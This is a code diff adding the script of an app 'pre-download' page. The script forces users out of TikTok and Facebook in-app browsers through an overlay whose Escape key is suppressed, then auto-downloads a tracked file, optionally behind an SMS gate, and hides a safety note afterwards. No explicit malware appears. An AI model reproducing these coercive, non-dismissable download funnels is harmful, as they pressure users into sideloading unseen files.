+        overlay.setAttribute('aria-describedby', 'PreDownloadInAppBrowserMessage');
+
+        var panel = document.createElement('div');
+        panel.className = 'pd-iab-prompt__panel';
+
+        var badge = document.createElement('div');
+        badge.className = 'pd-iab-prompt__badge';
+        badge.setAttribute('aria-hidden', 'true');
+        badge.innerHTML = '<svg id="pdBrowserIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48" aria-hidden="true"><circle cx="24" cy="24" r="20" fill="#e8f6dc" stroke="#5ead2f" stroke-width="2.5"/><ellipse cx="24" cy="24" rx="8" ry="20" fill="none" stroke="#5ead2f" stroke-width="2"/><path d="M6 24h36M8.5 15h31M8.5 33h31" fill="none" stroke="#5ead2f" stroke-width="2" stroke-linecap="round"/><circle cx="24" cy="24" r="3.5" fill="#168a2f"/></svg>';
+
+        var title = document.createElement('h2');
+        title.id = 'PreDownloadInAppBrowserTitle';
+        title.className = 'pd-iab-prompt__title';
+        title.textContent = payload.inAppBrowserTitle || 'Open in browser to continue';
+
+        var message = document.createElement('p');
+        message.id = 'PreDownloadInAppBrowserMessage';
+        message.className = 'pd-iab-prompt__message';
+        message.textContent = payload.inAppBrowserMessage || 'This download page does not work inside TikTok or Facebook. You must continue in your browser.';
+
+        var actions = document.createElement('div');
+        actions.className = 'pd-iab-prompt__actions';
+
+        if (isAndroid) {
+            var openLink = document.createElement('a');
+            openLink.className = 'pd-iab-prompt__open';
+            openLink.href = intentUrl;
+            openLink.textContent = payload.inAppBrowserOpenLabel || 'Open in browser';
+            actions.appendChild(openLink);
+        }
+
+        var manualHeading = document.createElement('p');
+        manualHeading.className = 'pd-iab-prompt__manual';
+        manualHeading.textContent = isAndroid
+            ? (payload.inAppBrowserManualHeading || 'If the button does not work:')
+            : (payload.inAppBrowserManualHeading || 'Follow these steps:');
+
+        var steps = document.createElement('ol');
+        steps.className = 'pd-iab-prompt__steps';
+
+        var stepMenu = document.createElement('li');
+        stepMenu.innerHTML = '<span class="pd-iab-prompt__app">' + (browserInfo.name || 'App') + ':</span> ' + (payload.inAppBrowserStepMenu || 'Tap ⋯ at the top right');
+
+        var stepOpenBrowser = document.createElement('li');
+        stepOpenBrowser.textContent = payload.inAppBrowserStepOpenBrowser || 'Select "Open in browser" (globe icon)';
+
+        steps.appendChild(stepMenu);
+        steps.appendChild(stepOpenBrowser);
+
+        panel.appendChild(badge);
+        panel.appendChild(title);
+        panel.appendChild(message);
+        if (isAndroid) {
+            panel.appendChild(actions);
+        }
+        panel.appendChild(manualHeading);
+        panel.appendChild(steps);
+        overlay.appendChild(panel);
+        document.head.appendChild(style);
+        document.body.appendChild(overlay);
+
+        document.addEventListener('keydown', function (event) {
+            if (event.key === 'Escape') {
+                event.preventDefault();
+            }
+        }, true);
+    };
+
+    var syncInAppBrowserPrompt = function () {
+        if (!payload.inAppBrowserGateEnabled) {
+            if (inAppBrowserBlocked) {
+                releaseInAppBrowserBlock();
+            }
+            return;
+        }
+
+        if (!detectInAppBrowser().inApp) {
+            if (inAppBrowserBlocked) {
+                releaseInAppBrowserBlock();
+            }
+            return;
+        }
+
+        if (!document.getElementById('PreDownloadInAppBrowserPrompt')) {
+            showInAppBrowserPrompt(inAppBrowserInfo);
+        }
+    };
+
+    var inAppBrowserInfo = detectInAppBrowser();
+    if (payload.inAppBrowserGateEnabled && inAppBrowserInfo.inApp) {
+        showInAppBrowserPrompt(inAppBrowserInfo);
+        window.addEventListener('pageshow', syncInAppBrowserPrompt);
+        document.addEventListener('visibilitychange', function () {
+            if (!document.hidden) {
+                syncInAppBrowserPrompt();
+            }
+        });
+    }
+
+    var ensureDownloadCompleteElements = function () {
+        var existingStatus = document.querySelector('[data-pd="downloadStatus"]');
+        var existingPointer = document.querySelector('[data-pd="downloadsPointer"]');
+        var existingAgainButton = document.querySelector('[data-pd="downloadAgainButton"]');
+
+        if (existingStatus && existingPointer && existingAgainButton) {
+            return;
+        }
+
+        var anchor = downloadButtons[0] || document.querySelector('[data-pd="countdown"]') || document.body;
+        var container = document.querySelector('[data-pd="downloadCompletePanel"]');
+
+        if (!container) {
+            container = document.createElement('div');
+            container.setAttribute('data-pd', 'downloadCompletePanel');
+            container.hidden = true;
+            anchor.insertAdjacentElement('afterend', container);
+        }
+
+        if (!existingStatus) {
+            existingStatus = document.createElement('p');
+            existingStatus.setAttribute('data-pd', 'downloadStatus');
+            existingStatus.hidden = true;
+            container.appendChild(existingStatus);
+        }
+
+        if (!existingPointer) {
+            existingPointer = document.createElement('div');
+            existingPointer.setAttribute('data-pd', 'downloadsPointer');
+            existingPointer.hidden = true;
+            existingPointer.textContent = payload.downloadsPointerText || 'Check your browser Downloads notification.';
+            container.appendChild(existingPointer);
+        }
+
+        if (!existingAgainButton) {
+            existingAgainButton = document.createElement('a');
+            existingAgainButton.setAttribute('data-pd', 'downloadAgainButton');
+            existingAgainButton.hidden = true;
+            container.appendChild(existingAgainButton);
+        }
+    };
+
+    ensureDownloadCompleteElements();
+
+    var installGuideRoot = document.querySelector('[data-pd="installGuide"]');
+    var installGuideAccordion = document.querySelector('[data-pd="installGuideAccordion"]');
+    var guideSectionElements = [];
+
+    var getInstallGuideSections = function () {
+        if (Array.isArray(payload.installGuideSections) && payload.installGuideSections.length > 0) {
+            return payload.installGuideSections;
+        }
+
+        return [];
+    };
+
+    var setGuideSectionOpen = function (targetSection, open) {
+        var trigger = targetSection.querySelector('.guide-section__trigger');
+        if (!trigger) {
+            return;
+        }
+
+        var panelId = trigger.getAttribute('aria-controls');
+        var panel = panelId ? document.getElementById(panelId) : null;
+
+        targetSection.classList.toggle('is-open', open);
+        trigger.setAttribute('aria-expanded', open ? 'true' : 'false');
+        if (panel) {
+            panel.hidden = !open;
+        }
+    };
+
+    var closeOtherGuideSections = function (exceptSection) {
+        guideSectionElements.forEach(function (sectionEl) {
+            if (sectionEl !== exceptSection) {
+                setGuideSectionOpen(sectionEl, false);
+            }
+        });
+    };
+
+    var renderInstallGuide = function () {
+        if (!installGuideRoot || !installGuideAccordion) {
+            return;
+        }
+
+        bindText('installGuideTitle', payload.installGuideTitle || 'How to install the app');
+        installGuideAccordion.textContent = '';
+        guideSectionElements = [];
+
+        getInstallGuideSections().forEach(function (section, index) {
+            var sectionId = section.id || ('guide-' + index);
+            var panelId = 'install-guide-panel-' + sectionId;
+            var isOpen = !!section.defaultOpen;
+
+            var wrapper = document.createElement('div');
+            wrapper.className = 'guide-section' + (isOpen ? ' is-open' : '');
+            wrapper.setAttribute('data-guide-id', sectionId);
+
+            var trigger = document.createElement('button');
+            trigger.type = 'button';
+            trigger.className = 'guide-section__trigger';
+            trigger.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
+            trigger.setAttribute('aria-controls', panelId);
+
+            var titleSpan = document.createElement('span');
+            titleSpan.textContent = section.title || ('Section ' + (index + 1));
+            var chevron = document.createElement('span');
+            chevron.className = 'guide-section__chevron';
+            chevron.setAttribute('aria-hidden', 'true');
+            trigger.appendChild(titleSpan);
+            trigger.appendChild(chevron);
+
+            var panel = document.createElement('div');
+            panel.className = 'guide-section__panel';
+            panel.id = panelId;
+            panel.hidden = !isOpen;
+
+            var body = document.createElement('div');
+            body.className = 'guide-section__body';
+
+            if (section.imageUrl) {
+                var image = document.createElement('img');
+                image.className = 'guide-section__image';
+                image.src = section.imageUrl;
+                image.alt = section.title || 'Install guide';
+                image.loading = 'lazy';
+                body.appendChild(image);
+            }
+
+            if (Array.isArray(section.steps) && section.steps.length > 0) {
+                var list = document.createElement('ol');
+                list.className = 'guide-section__steps';
+                section.steps.forEach(function (stepText) {
+                    var item = document.createElement('li');
+                    item.textContent = stepText;
+                    list.appendChild(item);
+                });
+                body.appendChild(list);
+            }
+
+            panel.appendChild(body);
+            wrapper.appendChild(trigger);
+            wrapper.appendChild(panel);
+
+            trigger.addEventListener('click', function () {
+                var willOpen = !wrapper.classList.contains('is-open');
+                if (willOpen) {
+                    closeOtherGuideSections(wrapper);
+                }
+                setGuideSectionOpen(wrapper, willOpen);
+            });
+
+            installGuideAccordion.appendChild(wrapper);
+            guideSectionElements.push(wrapper);
+        });
+    };
+
+    if (payload.installGuideEnabled) {
+        renderInstallGuide();
+    }
+
+    var scrollToInstallGuide = function () {
+        if (!installGuideRoot) {
+            return;
+        }
+
+        var prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+        var offset = parseInt(payload.installGuideScrollOffset, 10) || 0;
+
+        window.requestAnimationFrame(function () {
+            var top = installGuideRoot.getBoundingClientRect().top + window.scrollY - offset;
+            window.scrollTo({
+                top: Math.max(0, top),
+                behavior: prefersReducedMotion ? 'auto' : 'smooth'
+            });
+        });
+    };
+
+    var remaining = Math.max(0, parseInt(payload.countdownSeconds, 10) || 0);
+    var countdownElements = document.querySelectorAll('[data-pd="countdown"]');
+    var renderCountdown = function () {
+        countdownElements.forEach(function (element) {
+            element.textContent = String(remaining);
+        });
+    };
+
+    var completeMessage = payload.downloadCompleteText || 'Downloaded file. Open Downloads to check the file.';
+    var downloadAgainText = payload.downloadAgainText || 'Download again';
+    var timer = null;
+
+    var clearTimer = function () {
+        if (timer) {
+            window.clearInterval(timer);
+            timer = null;
+        }
+    };
+
+    var markDownloadStartedLegacy = function () {
+        bindTextIfEmpty('downloadStatus', completeMessage);
+        bindTextIfEmpty('downloadAgainButton', downloadAgainText);
+
+        countdownElements.forEach(function (element) {
+            element.textContent = '0';
+            element.setAttribute('aria-hidden', 'true');
+        });
+
+        hideOriginalDownloadActions();
+        setHidden('[data-pd="loadingPanel"], [data-pd="loadingIndicator"]', true);
+        setHidden('[data-pd="downloadCompletePanel"], [data-pd="downloadStatus"], [data-pd="downloadAgainButton"], [data-pd="downloadsPointer"]', false);
+        document.querySelectorAll('[data-pd="downloadsPointer"]').forEach(function (element) {
+            element.setAttribute('data-pd-guidance', 'downloads-menu-or-notification');
+        });
+
+        document.querySelectorAll('[data-pd="downloadAgainButton"]').forEach(function (element) {
+            element.setAttribute('href', buildTrackedDownloadUrl(ensureDownloadClickId()));
+            element.setAttribute('rel', 'noopener');
+        });
+    };
+
+    var markDownloadStartedWithGuide = function () {
+        bindTextIfEmpty('downloadStatus', completeMessage);
+        bindTextIfEmpty('downloadAgainButton', downloadAgainText);
+        bindText('appSub', payload.appSubComplete || completeMessage);
+
+        countdownElements.forEach(function (element) {
+            element.textContent = '0';
+            element.setAttribute('aria-hidden', 'true');
+        });
+
+        hideOriginalDownloadActions();
+        setHidden('[data-pd="loadingPanel"], [data-pd="loadingIndicator"]', true);
+        setHidden('[data-pd="safetyNote"]', true);
+        setHidden('[data-pd="downloadsPointer"]', true);
+        setHidden('[data-pd="downloadCompletePanel"], [data-pd="downloadStatus"], [data-pd="downloadAgainButton"]', false);
+
+        document.querySelectorAll('[data-pd="statusCard"], .status-card').forEach(function (element) {
+            element.classList.add('is-compact');
+        });
+        document.querySelectorAll('.shell, .page, main').forEach(function (element) {
+            element.classList.add('is-post-download');
+        });
+        document.querySelectorAll('.help, section.help').forEach(function (element) {
+            element.hidden = true;
+            element.setAttribute('aria-hidden', 'true');
+        });
+
+        if (installGuideRoot) {
+            installGuideRoot.hidden = false;
+            installGuideRoot.setAttribute('aria-hidden', 'false');
+            scrollToInstallGuide();
+        }
+
+        document.querySelectorAll('[data-pd="downloadAgainButton"]').forEach(function (element) {
+            element.setAttribute('href', buildTrackedDownloadUrl(ensureDownloadClickId()));
+            element.setAttribute('rel', 'noopener');
+        });
+    };
+
+    var markDownloadStarted = function () {
+        if (payload.installGuideEnabled) {
+            markDownloadStartedWithGuide();
+            return;
+        }
+
+        markDownloadStartedLegacy();
+    };
+
+    var startDownload = function () {
+        clearTimer();
+        var clickId = ensureDownloadClickId();
+        var trackedUrl = buildTrackedDownloadUrl(clickId);
+        trackPredownloadAutoRedirect(function () {
+            markDownloadStarted();
+            window.location.href = trackedUrl;
+        });
+    };
+
+    var handleDownloadButtonClick = function (event, element) {
+        clearTimer();
+
+        if (!payload.downloadUrl) {
+            window.setTimeout(markDownloadStarted, 0);
+            return;
+        }
+
+        event.preventDefault();
+        var clickId = ensureDownloadClickId();
+        var trackedUrl = buildTrackedDownloadUrl(clickId);
+        element.setAttribute('href', trackedUrl);
+        var buttonId = element.getAttribute('id') || element.getAttribute('data-button-id') || element.getAttribute('data-pd') || 'downloadButton';
+
+        trackPredownloadButtonClick(buttonId, clickId, function () {
+            markDownloadStarted();
+            window.location.href = trackedUrl;
+        });
+    };
+
+    downloadButtons.forEach(function (element) {
+        element.addEventListener('click', function (event) {
+            handleDownloadButtonClick(event, element);
+        });
+    });
+
+    document.querySelectorAll('[data-pd="downloadAgainButton"]').forEach(function (element) {
+        element.addEventListener('click', function (event) {
+            if (!payload.downloadUrl) {
+                return;
+            }
+
+            event.preventDefault();
+            var clickId = ensureDownloadClickId();
+            var trackedUrl = buildTrackedDownloadUrl(clickId);
+            element.setAttribute('href', trackedUrl);
+            trackPredownloadButtonClick('downloadAgainButton', clickId, function () {
+                window.location.href = trackedUrl;
+            });
+        });
+    });
+
+    var startAutoDownloadCountdown = function () {
+        if (!payload.downloadUrl) {
+            return;
+        }
+
+        if (remaining <= 0) {
+            startDownload();
+            return;
+        }
+
+        timer = window.setInterval(function () {
+            remaining -= 1;
+            renderCountdown();
+
+            if (remaining <= 0) {
+                startDownload();
+            }
+        }, 1000);
+    };
+
+    var maybeStartAutoDownload = function () {
+        if (!payload.downloadUrl) {
+            return;
+        }
+
+        if (inAppBrowserBlocked) {
+            return;
+        }
+
+        if (smsGateRequired && !smsGateComplete) {
+            return;
+        }
+
+        if (!smsGateRequired && !payload.autoRedirectEnabled) {
+            return;
+        }
+
+        startAutoDownloadCountdown();
+    };
+
+    window.addEventListener('preDownloadSmsGateComplete', function () {
+        smsGateComplete = true;
+        maybeStartAutoDownload();
+    });
+
+    renderCountdown();
+    maybeStartAutoDownload();
+})();
+</script>
+</body>
+</html>
